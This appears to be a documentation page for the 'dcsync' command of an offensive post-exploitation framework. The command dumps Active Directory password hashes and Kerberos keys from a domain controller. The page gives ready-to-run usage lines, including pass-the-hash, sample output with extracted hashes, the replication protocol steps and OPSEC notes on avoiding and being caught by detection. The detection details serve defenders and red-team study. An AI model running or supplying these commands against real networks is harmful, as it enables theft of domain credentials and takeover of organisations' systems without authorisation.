+++
title = "dcsync"
chapter = false
weight = 103
hidden = false
+++

## Summary

DCSync — replicate Active Directory account credentials via Directory Replication Services (MS-DRSR) without touching LSASS. Uses DRSGetNCChanges to request password data directly from a Domain Controller, extracting NTLM hashes, LM hashes, and Kerberos keys (AES256, AES128).

Requires an account with **Replicating Directory Changes** and **Replicating Directory Changes All** rights (typically Domain Admins, Enterprise Admins, or accounts explicitly granted these permissions).

Supports pass-the-hash authentication. Cross-platform — works from Windows, Linux, and macOS agents.

## Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| server | Yes | Domain Controller IP or hostname |
| username | Yes | Account with replication rights (`DOMAIN\user` or `user@domain`) |
| password | No* | Password (*required unless hash is provided) |
| hash | No* | NT hash for pass-the-hash (hex, e.g., `aad3b435...:8846f7ea...` or just NT hash) |
| domain | No | Domain name (auto-detected from username if `DOMAIN\user` or `user@domain` format) |
| target | Yes | Target account(s) to dump, comma-separated (e.g., `Administrator,krbtgt`) |
| timeout | No | Operation timeout in seconds (default: 120) |

## Usage

### Single account with password
```
dcsync -server 192.168.1.1 -username admin@corp.local -password P@ssw0rd -target Administrator
```

### Multiple accounts
```
dcsync -server dc01 -username CORP\admin -password P@ssw0rd -target "Administrator,krbtgt,svc_backup"
```

### Pass-the-hash
```
dcsync -server dc01 -username CORP\admin -hash aad3b435b51404ee:8846f7eaee8fb117 -target Administrator
```

### Explicit domain
```
dcsync -server dc01 -username admin -password P@ssw0rd -domain CORP.LOCAL -target krbtgt
```

## Output

The command outputs results in a structured format:

```
[*] DCSync via DRSGetNCChanges against 192.168.1.1 (password)
[*] Credentials: CORP\admin
------------------------------------------------------------

[+] Administrator (RID: 500)
    NTLM:   dbd13e1c4e338284ac4e9874f7de6ef4
    AES256: ec9ad6fa2d84fd4515a8636116b93a79f970b01b938e701263a18346d57c8d18
    AES128: 628fa331fbcbe93204b40b881a94ae12
    Hash:   Administrator:500:aad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::

[*] 1/1 accounts dumped successfully
```

- **NTLM**: NT hash (MD4 of UTF-16LE password)
- **AES256/AES128**: Kerberos encryption keys (from supplemental credentials)
- **Hash line**: Secretsdump-compatible format (`user:RID:LM:NT:::`)

## Protocol Details

DCSync uses the MS-DRSR (Directory Replication Services Remote) protocol:

1. **DCE-RPC connection** via Endpoint Mapper (port 135)
2. **DRSBind** — establish replication session with encryption
3. **DRSCrackNames** — resolve account names to GUIDs
4. **DRSGetNCChanges** — replicate individual objects with `EXOP_REPL_OBJ` extended operation
5. **Decrypt** hashes using session key (NT hash, LM hash, supplemental credentials)

### Multi-Domain Forest Handling

When a domain is specified (via username format or explicit `-domain` parameter), DCSync uses NT4 account format (`NETBIOSDOMAIN\account`) for unambiguous name resolution. This prevents `DSNameErrorNotUnique` errors in multi-domain forests where account names exist in multiple domains visible to a single DC.

Without a domain, uses `SansDomainEx` format which resolves within the DC's own domain.

## OPSEC Considerations

- **Network traffic**: DCE-RPC to the DC on dynamic ports (via EPM on port 135). Encrypted with NTLM session seal.
- **Event logs**: DRSGetNCChanges generates **Event ID 4662** (An operation was performed on an object) with replication rights GUIDs on the Domain Controller
- **Detection**: Security monitoring tools like Microsoft Defender for Identity (MDI) specifically detect DCSync by watching for non-DC sources performing DRSGetNCChanges
- **No LSASS interaction**: Unlike credential dumping tools (Mimikatz sekurlsa, procdump), DCSync does not touch the LSASS process — no process injection, no memory reading
- **Permissions required**: Replicating Directory Changes + Replicating Directory Changes All — these are high-privilege rights typically held by DCs themselves, Domain Admins, and Enterprise Admins

## MITRE ATT&CK Mapping

- T1003.006 — OS Credential Dumping: DCSync
